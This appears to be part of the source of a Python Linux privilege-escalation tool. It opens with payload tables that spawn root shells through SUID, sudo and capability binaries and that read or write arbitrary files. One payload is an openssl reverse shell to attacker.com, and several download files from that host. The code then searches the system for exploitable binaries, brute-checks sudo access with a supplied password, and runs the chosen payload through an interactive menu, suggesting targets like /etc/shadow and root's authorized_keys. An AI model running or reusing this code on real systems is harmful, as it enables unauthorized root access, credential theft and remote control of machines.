		"LFILE=file_to_read\n./xxd \"$LFILE\" | xxd -r\n"
	],
	"eqn":
	[
		"LFILE=file_to_read\n./eqn \"$LFILE\"\n"
	],
	"ksh":
	[
		"./ksh -p"
	],
	"ld.so":
	[
		"./ld.so /bin/sh -p"
	],
	"date":
	[
		"LFILE=file_to_read\n./date -f $LFILE\n"
	],
	"tac":
	[
		"LFILE=file_to_read\n./tac -s 'RANDOM' \"$LFILE\"\n"
	],
	"wget":
	[
		"URL=http://attacker.com/file_to_get\nLFILE=file_to_save\n./wget $URL -O $LFILE\n"
	],
	"start-stop-daemon":
	[
		"./start-stop-daemon -n $RANDOM -S -x /bin/sh -- -p"
	],
	"column":
	[
		"LFILE=file_to_read\n./column $LFILE\n"
	],
	"gtester":
	[
		"TF=$(mktemp)\necho '#!/bin/sh -p' > $TF\necho 'exec /bin/sh -p 0<&1' >> $TF\nchmod +x $TF\nsudo gtester -q $TF\n"
	],
	"fold":
	[
		"LFILE=file_to_read\n./fold -w99999999 \"$LFILE\"\n"
	],
	"less":
	[
		"./less file_to_read"
	],
	"jrunscript":
	[
		"./jrunscript -e \"exec('/bin/sh -pc \\$@|sh\\${IFS}-p _ echo sh -p <$(tty) >$(tty) 2>$(tty)')\""
	],
	"run-parts":
	[
		"./run-parts --new-session --regex '^sh$' /bin --arg='-p'"
	],
	"rvim":
	[
		"./rvim -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'"
	],
	"uudecode":
	[
		"LFILE=file_to_read\nuuencode \"$LFILE\" /dev/stdout | uudecode\n"
	],
	"sysctl":
	[
		"LFILE=file_to_read\n./sysctl -n \"/../../$LFILE\"\n"
	],
	"node":
	[
		"./node -e 'require(\"child_process\").spawn(\"/bin/sh\", [\"-p\"], {stdio: [0, 1, 2]});'\n"
	],
	"php":
	[
		"CMD=\"/bin/sh\"\n./php -r \"pcntl_exec('/bin/sh', ['-p']);\"\n"
	],
	"watch":
	[
		"./watch -x sh -c 'reset; exec sh 1>&0 2>&0'"
	],
	"install":
	[
		"LFILE=file_to_change\nTF=$(mktemp)\n./install -m 6777 $LFILE $TF\n"
	],
	"rlwrap":
	[
		"./rlwrap -H /dev/null /bin/sh -p"
	],
	"basenc":
	[
		"LFILE=file_to_read\nbasenc --base64 $LFILE | basenc -d --base64\n"
	],
	"highlight":
	[
		"LFILE=file_to_read\n./highlight --no-doc --failsafe \"$LFILE\"\n"
	],
	"dmsetup":
	[
		"./dmsetup create base <<EOF\n0 3534848 linear /dev/loop0 94208\nEOF\n./dmsetup ls --exec '/bin/sh -p -s'\n"
	],
	"xz":
	[
		"LFILE=file_to_read\n./xz -c \"$LFILE\" | xz -d\n"
	],
	"stdbuf":
	[
		"./stdbuf -i0 /bin/sh -p"
	],
	"hexdump":
	[
		"LFILE=file_to_read\n./hexdump -C \"$LFILE\"\n"
	],
	"paste":
	[
		"LFILE=file_to_read\npaste $LFILE\n"
	],
	"base32":
	[
		"LFILE=file_to_read\nbase32 \"$LFILE\" | base32 --decode\n"
	],
	"jjs":
	[
		"echo \"Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -pc \\$@|sh\\${IFS}-p _ echo sh -p <$(tty) >$(tty) 2>$(tty)').waitFor()\" | ./jjs"
	],
	"setarch":
	[
		"./setarch $(arch) /bin/sh -p"
	],
	"dd":
	[
		"LFILE=file_to_write\necho \"data\" | ./dd of=$LFILE\n"
	],
	"env":
	[
		"./env /bin/sh -p"
	],
	"base64":
	[
		"LFILE=file_to_read\n./base64 \"$LFILE\" | base64 --decode\n"
	],
	"curl":
	[
		"URL=http://attacker.com/file_to_get\nLFILE=file_to_save\n./curl $URL -o $LFILE\n"
	],
	"hd":
	[
		"LFILE=file_to_read\n./hd \"$LFILE\"\n"
	],
	"pg":
	[
		"./pg file_to_read"
	],
	"zsoelim":
	[
		"LFILE=file_to_read\n./zsoelim \"$LFILE\"\n"
	],
	"dialog":
	[
		"LFILE=file_to_read\n./dialog --textbox \"$LFILE\" 0 0\n"
	],
	"uuencode":
	[
		"LFILE=file_to_read\nuuencode \"$LFILE\" /dev/stdout | uudecode\n"
	],
	"comm":
	[
		"LFILE=file_to_read\ncomm $LFILE /dev/null 2>/dev/null\n"
	],
	"chmod":
	[
		"LFILE=file_to_change\n./chmod 6777 $LFILE\n"
	],
	"rev":
	[
		"LFILE=file_to_read\n./rev $LFILE | rev\n"
	],
	"nohup":
	[
		"sudo nohup /bin/sh -p -c \"sh -p <$(tty) >$(tty) 2>$(tty)\""
	],
	"od":
	[
		"LFILE=file_to_read\n./od -An -c -w9999 \"$LFILE\"\n"
	],
	"time":
	[
		"./time /bin/sh -p"
	],
	"rsync":
	[
		"./rsync -e 'sh -p -c \"sh 0<&2 1>&2\"' 127.0.0.1:/dev/null"
	],
	"logsave":
	[
		"./logsave /dev/null /bin/sh -i -p"
	],
	"csplit":
	[
		"LFILE=file_to_read\ncsplit $LFILE 1\ncat xx01\n"
	],
	"tee":
	[
		"LFILE=file_to_write\necho DATA | ./tee -a \"$LFILE\"\n"
	],
	"troff":
	[
		"LFILE=file_to_read\n./troff $LFILE\n"
	],
	"fmt":
	[
		"LFILE=file_to_read\n./fmt -999 \"$LFILE\"\n"
	],
	"tail":
	[
		"LFILE=file_to_read\n./tail -c1G \"$LFILE\"\n"
	],
	"expect":
	[
		"./expect -c 'spawn /bin/sh -p;interact'"
	],
	"openssl":
	[
		"RHOST=attacker.com\nRPORT=12345\nmkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | ./openssl s_client -quiet -connect $RHOST:$RPORT > /tmp/s; rm /tmp/s\n",
		"LFILE=file_to_write\necho DATA | openssl enc -out \"$LFILE\"\n"
	],
	"unexpand":
	[
		"LFILE=file_to_read\n./unexpand -t99999999 \"$LFILE\"\n"
	],
	"iconv":
	[
		"LFILE=file_to_read\n./iconv -f 8859_1 -t 8859_1 \"$LFILE\"\n"
	],
	"grep":
	[
		"LFILE=file_to_read\n./grep '' $LFILE\n"
	],
	"hping3":
	[
		"./hping3\n/bin/sh\n"
	],
	"strace":
	[
		"./strace -o /dev/null /bin/sh -p"
	],
	"csh":
	[
		"./csh -b"
	],
	"ul":
	[
		"LFILE=file_to_read\n./ul \"$LFILE\"\n"
	],
	"timeout":
	[
		"./timeout 7d /bin/sh -p"
	],
	"taskset":
	[
		"./taskset 1 /bin/sh -p"
	],
	"ssh-keyscan":
	[
		"LFILE=file_to_read\n./ssh-keyscan -f $LFILE\n"
	],
	"capsh":
	[
		"./capsh --gid=0 --uid=0 --"
	],
	"docker":
	[
		"./docker run -v /:/mnt --rm -it alpine chroot /mnt sh"
	],
	"tclsh":
	[
		"./tclsh\nexec /bin/sh -p <@stdin >@stdout 2>@stderr\n"
	],
	"dash":
	[
		"./dash -p"
	],
	"zsh":
	[
		"./zsh"
	],
	"join":
	[
		"LFILE=file_to_read\njoin -a 2 /dev/null $LFILE\n"
	],
	"cp":
	[
		"LFILE=file_to_write\necho \"DATA\" | ./cp /dev/stdin \"$LFILE\"\n",
		"LFILE=file_to_write\nTF=$(mktemp)\necho \"DATA\" > $TF\n./cp $TF $LFILE\n"
	],
	"gimp":
	[
		"./gimp -idf --batch-interpreter=python-fu-eval -b 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'"
	],
	"chroot":
	[
		"./chroot / /bin/sh -p\n"
	],
	"xmodmap":
	[
		"LFILE=file_to_read\n./xmodmap -v $LFILE\n"
	],
	"perl":
	[
		"./perl -e 'exec \"/bin/sh\";'"
	],
	"sort":
	[
		"LFILE=file_to_read\n./sort -m \"$LFILE\"\n"
	],
	"cat":
	[
		"LFILE=file_to_read\n./cat \"$LFILE\"\n"
	],
	"aria2c":
	[
		"COMMAND='id'\nTF=$(mktemp)\necho \"$COMMAND\" > $TF\nchmod +x $TF\n./aria2c --on-download-error=$TF http://x\n"
	],
	"shuf":
	[
		"LFILE=file_to_write\n./shuf -e DATA -o \"$LFILE\"\n"
	],
	"sed":
	[
		"LFILE=file_to_read\n./sed -e '' \"$LFILE\"\n"
	],
	"soelim":
	[
		"LFILE=file_to_read\n./soelim \"$LFILE\"\n"
	],
	"look":
	[
		"LFILE=file_to_read\n./look '' \"$LFILE\"\n"
	],
	"bash":
	[
		"./bash -p"
	],
	"chown":
	[
		"LFILE=file_to_change\n./chown $(id -un):$(id -gn) $LFILE\n"
	],
	"unshare":
	[
		"./unshare -r /bin/sh"
	],
	"readelf":
	[
		"LFILE=file_to_read\n./readelf -a @$LFILE\n"
	],
	"cut":
	[
		"LFILE=file_to_read\n./cut -d \"\" -f1 \"$LFILE\"\n"
	],
	"mv":
	[
		"LFILE=file_to_write\nTF=$(mktemp)\necho \"DATA\" > $TF\n./mv $TF $LFILE\n"
	],
	"lwp-download":
	[
		"URL=http://attacker.com/file_to_get\nLFILE=file_to_save\n./lwp-download $URL $LFILE\n"
	]
}

capabilities = {
	"gdb":
	[
		"./gdb -nx -ex 'python import os; os.setuid(0)' -ex '!sh' -ex quit"
	],
	"vim":
	[
		"./vim -c ':py import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'"
	],
	"python":
	[
		"./python -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'"
	],
	"view":
	[
		"./view -c ':py import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'"
	],
	"rview":
	[
		"./rview -c ':py import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'"
	],
	"rvim":
	[
		"./rvim -c ':py import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'"
	],
	"node":
	[
		"./node -e 'process.setuid(0); require(\"child_process\").spawn(\"/bin/sh\", {stdio: [0, 1, 2]});'\n"
	],
	"php":
	[
		"CMD=\"/bin/sh\"\n./php -r \"posix_setuid(0); system('$CMD');\"\n"
	],
	"ruby":
	[
		"./ruby -e 'Process::Sys.setuid(0); exec \"/bin/sh\"'"
	],
	"perl":
	[
		"./perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec \"/bin/sh\";'"
	]
}

def print_finding(text):
	print(BOLD + GREEN + "[!] " + text + RESET)

def print_potential(text):
	print(YELLOW + "[!] " + text + RESET)

def print_exploit(text):
	print(RED + "[!] " + text + RESET)

def print_error(text):
	print(BOLD + RED + "[x] " + text + RESET)

def print_exec(text):
	print(BOLD + CYAN + "[!] " + text + RESET)

def print_info(text):
	print(BOLD + WHITE + "[*] " + text + RESET)


def arbitrary_file_read(binary, payload):
	print_exec("\nPerforming arbitrary file read with: " + binary)
	print("Enter the file that you wish to read. (eg: /etc/shadow)")
	file_to_read = input("> ")
	payload = payload.replace("file_to_read", file_to_read)
	os.system(payload)

def arbitrary_file_write(binary, payload):
	print_exec("\nPerforming arbitrary file write with: " + binary)
	print(BOLD + GREEN + "Create a file named " + BOLD + RED + "input_file" + BOLD + GREEN + " containing the file content")
	print_info("Spawning temporary shell to create file, type 'exit' when done")
	os.system("bash")
	print("Enter the file path that you wish to write to. (eg: /root/.ssh/authorized_keys)")
	file_to_write = input("> ")
	payload = payload.replace("file_to_write", file_to_write)
	os.system(payload)

def exploit_sudo(binary, payload):
	if "file_to_read" in payload:
		arbitrary_file_read(binary, payload)
	elif "file_to_write" in payload:
		arbitrary_file_write(binary, payload)
	else:
		print_finding("Spawning root shell")
		os.system(payload)

def exploit_suid(binary, binary_path, payload):
	payload = payload.replace("./"+binary, binary_path)
	if "file_to_read" in payload:
		arbitrary_file_read(binary_path, payload)
	elif "file_to_write" in payload:
		arbitrary_file_write(binary_path, payload)
	else:
		print_finding("Spawning root shell")
		os.system(payload)

def exploit_capabilities(binary, binary_path, payload):
	payload = payload.replace("./"+binary, binary_path)
	if "file_to_read" in payload:
		arbitrary_file_read(binary_path, payload)
	elif "file_to_write" in payload:
		arbitrary_file_write(binary_path, payload)
	else:
		print_finding("Spawning root shell")
		os.system(payload)

def sudo_escalate(sudo_password):
	print_title("[#] FINDING SUDO BINARIES [#]")
	# print("Enter sudo password, leave blank to check for NOPASSWD breakout (slow)")
	potential_sudo = []
	print_info("Attempting search of sudo binaries with provided password: " + sudo_password)
	for binary in sudo_bins.keys():
		cmd = subp.Popen("{ echo '" + sudo_password + "'; } | sudo -kS " + binary, shell=True, stdout=subp.PIPE, stderr=subp.PIPE)
		#if args.verbose:
		#	print("Now checking " + binary)
		res, err = cmd.communicate()
		#if b"is not allowed to execute" in err:
		#	if args.verbose:
		#		print_error("No sudo permissions for " + binary)
		if b"command not found" in err:
			continue
		elif b"no password was provided" in err:
			continue
		elif b"Sorry, try again." in err:
			continue
		elif b"incorrect password attempt" in err:
			continue
		elif b"Sorry, try again" in res:
			continue
		else:
			print_potential("Potential sudo privilege escalation via " + binary)
			potential_sudo.append(binary)
	print("")

	if potential_sudo == []:
		print_info("No potential vulnerable sudo binaries found.\n")

	return potential_sudo

def cap_escalate():
	print_title("[#] ENUMERATING SETUID CAPABILITIES [#]")
	cmd = subp.Popen("getcap -r / 2>/dev/null", shell=True, stdout=subp.PIPE, stderr=subp.PIPE)
	res, err = cmd.communicate()
	potential_caps = []
	res = res.decode("ascii")
	for binary in res.split("\n"):
		if "cap_setuid" in binary:
			binary = binary.split(" = ")
			binary_path = binary[0]
			binary = binary_path.split("/")[-1]
			print_finding("Found setuid capability for "+ binary_path)
			binary = binary.rstrip('1234567890.')
			potential_caps.append([binary, binary_path])
	
	if potential_caps == []:
		print_info("No setuid capabilities found.\n")

	return potential_caps

def payload_types(payload):
	if "file_to_read" in payload:
		return "Arbitrary read"
	elif "file_to_write" in payload:
		return "Arbitrary write"
	elif "file_to_change" in payload:
		return "File Permission Change"
	elif "sh" in payload:
		return "Shell"
	else:
		return "Unknown"

def suid_escalate():
	print_title("[#] FINDING SUID AND SGID BINARIES [#]")
	cmd = subp.Popen("find / -perm -4000 -type f 2>/dev/null", shell=True, stdout=subp.PIPE, stderr=subp.PIPE)
	res, err = cmd.communicate()
	binary_paths = []
	res = res.decode("ascii")
	binary_paths = res.split("\n")
	print(BOLD + CYAN + "[!] Found suid binaries:")
	sys.stdout.write(BOLD + YELLOW)
	print(res)

	cmd = subp.Popen("find / -perm -2000 -type f 2>/dev/null", shell=True, stdout=subp.PIPE, stderr=subp.PIPE)
	res, err = cmd.communicate()
	res = res.decode("ascii")
	sgid_binaries = res.split("\n")
	new_binaries = set(binary_paths) - set(sgid_binaries)
	binary_paths.extend(new_binaries)
	print(BOLD + CYAN + "[!] Found sgid binaries:")
	sys.stdout.write(BOLD + YELLOW)
	print(res + "\n")

	print_title2("[!] CHECKING FOR POTENTIALLY EXPLOITABLE SUID BINARIES [!]")
	potential_suid = []
	for binary_path in binary_paths:
		binary = binary_path.split("/")[-1]
		if binary == "":
			continue
		if binary.strip() in suid_bins.keys():
			print_exploit("Found potentially exploitable suid binary: " + binary)
			potential_suid.append([binary, binary_path])

	if potential_suid == []:
		print_info("No potential exploitable suid binary found.\n")

	print("")

	return potential_suid


########################################################################################################################################################
########################################################################################################################################################
########################################################################################################################################################
########################################################################################################################################################

if __name__ == '__main__':

	longsearch = True
	sudo_password = ''
	
	try:
		import argparse

	# Command line arguments
		parser = argparse.ArgumentParser(description='apes4Linux:')
		parser.add_argument(
			'-q', '--quick',
			help='Perform quick system enumeration (skip lengthy searches) and no automatic exploitation.',
			required=False,
			action='store_true',
			default=False
			)
		parser.add_argument(
			'-w', '--write', 
			help='Whether you want to save the enumeration results to a log file.', 
			required=False, 
			action='store_true'
			)
		parser.add_argument(
			'-o','--outfile', 
			help='The filename to write enumeration results into, must be writable for the current user.', 
			required=False, 
			default='apes4linux.log'
			)
		parser.add_argument(
			'--keepcolour', 
			help='Whether you want to keep all terminal colour escape codes in the log file. By default, the program removes all colour escape code to increase readability.', 
			required=False, 
			action='store_true', 
			default=False
			)
		parser.add_argument(
			'-e', '--exploit',
			help='Automatically attempt to exploit any vulnerabilities found to try and obtain root.',
			required=False,
			action='store_true',
			default=False
			)
		parser.add_argument(
			'-p', '--password',
			help='Current user sudo password (if exists) to assist with exploit finder. Default is blank.',
			required=False,
			default='',
			type=str
			)

		args = parser.parse_args()

		if args.outfile:
			import re
			ansi_re = re.compile(r'\x1b\[[0-9;]*m')

			# Logger to write files
			class Logger(object):
				def __init__(self):
					self.terminal = sys.stdout
					self.log = open(args.outfile, 'a')

				def write(self,result):
					self.terminal.write(result)
					if args.keepcolour:
						self.log.write(result)
					else:
						try:
							self.log.write(re.sub(ansi_re, '', result))
						except UnicodeEncodeError:
							self.log.write(result)
			sys.stdout = Logger()

		if args.password:
			sudo_password = args.password

		if args.quick:
			longsearch = False
		else:
			longsearch = True

	except ImportError:
		print("Failed to process arguments, printing everything by default.")
		longsearch = True

	# Print Logo
	print_banner()

######################
# SYSTEM ENUMERATION #
######################

	# Who Is Me?
	me = check_current_user()

	# Check Root
	root_check()

	# Enumerate System Information
	system_info = enum_basic_sysinfo()

	# Enumerate User Information
	user_info = enum_users()

	# Enumerate Network Information
	enum_network_info()

	# Enumerate Filesystem
	drive = enum_drive()

	if longsearch:
	# Enumerate File Permissions
		enum_files()

	# Enumerate Cron Jobs
	enum_cronjob()

	if longsearch:
		enum_all_cronjobs()

	# Enumerate Processes and Packages
	processes = enum_proc_app()

	# Enumerate Languages and Tools
	langtools = enum_langtool()


################################
# EXPLOIT FINDER AND SUGGESTER #
################################

	sys.stdout.write(BOLD + RED)
	text2 = "[-] STARTING EXPLOIT FINDER AND SUGGESTER [-]" 
	print_title2(text2)
	sys.stdout.write(RESET)
	time.sleep(2)

	# Find Exploit for sudo <= 1.2.8
	check_sudo_ver()

	# Identify Shell Escape Sequences
	enum_shellescape()

	# Search ExploitDB index
	high_chance, low_chance = search_exploits(system_info, langtools, processes, drive)

	if longsearch:
		# Search Passwords
		search_passwords()

	# Search sudo, suid, capabilities
	sudo_privesc = sudo_escalate(sudo_password)
	suid_privesc = suid_escalate()
	cap_privesc = cap_escalate()

	choices = []
	if sudo_privesc != []:
		choices.append("Exploit sudo binaries.")
	if suid_privesc != []:
		choices.append("Exploit suid binaries.")
	if cap_privesc != []:
		choices.append("Exploit capabilities.")

	if choices == []:
		print_error("No exploitable binaries found.")

	choices.append("Exit program.")

# AUTO EXPLOIT
	# if is_sudo128:
	# 	exploit_sudo128()

	if args.exploit:
		print_title("EXPLOIT METHOD MENU")
		for i in range(len(choices)):
			print(BOLD + BLUE + "(" + str(i) + ") " + BOLD + CYAN + choices[i])

		choice = input("> ")
		choice = int(choice)
		real_payload = []

		i = 0

		if choices[choice] == "Exploit sudo binaries.":
			print(BOLD + RED + "\n\nChoose payload to execute:")
			for sudo_binary in sudo_privesc:
				for payload in sudo_bins[sudo_binary]:
					real_payload.append([sudo_binary, payload])
					print(BOLD + CYAN + "(" + str(i) + ") " + BOLD + RED + sudo_binary + " " + BOLD + CYAN + payload_types(payload) + RESET)
					i = i + 1
			choice = input("Enter payload number: ")
			choice = int(choice)
			exploit_sudo(real_payload[choice][0], real_payload[choice][1])

		elif choices[choice] == "Exploit suid binaries.":
			print(BOLD + RED + "\n\nChoose payload to execute:")
			for suid_binary in suid_privesc:
				for payload in suid_bins[suid_binary[0]]:
					real_payload.append([suid_binary[0], suid_binary[1], payload])
					print(BOLD + CYAN + "(" + str(i) + ") " + BOLD + RED + suid_binary[0] + " " + BOLD + CYAN + payload_types(payload) + RESET)
					i = i + 1
			choice = input("Enter payload number: ")
			choice = int(choice)
			exploit_suid(real_payload[choice][0],real_payload[choice][1],real_payload[choice][2])

		elif choices[choice] == "Exploit capabilities.":
			print(BOLD + RED + "\n\nChoose payload to execute:")
			for cap_binary in cap_privesc:
				for payload in capabilities[cap_binary[0]]:
					real_payload.append([cap_binary[0], cap_binary[1], payload])
					print(BOLD + CYAN + "(" + str(i) + ") " + BOLD + RED + suid_binary[0] + " " + BOLD + CYAN + payload_types(payload) + RESET)
					i = i + 1
			choice = input("Enter payload number: ")
			choice = int(choice)
			exploit_suid(real_payload[choice][0],real_payload[choice][1],real_payload[choice][2])
		elif choices[choice] == "Quit":
			sys.exit(0)
		else:
			sys.exit(1)

	print_info("Enumeration Finished.\n")
	# print_info("Conclusion:")

	# vuln_exploitdbkernel(high_chance, low_chance)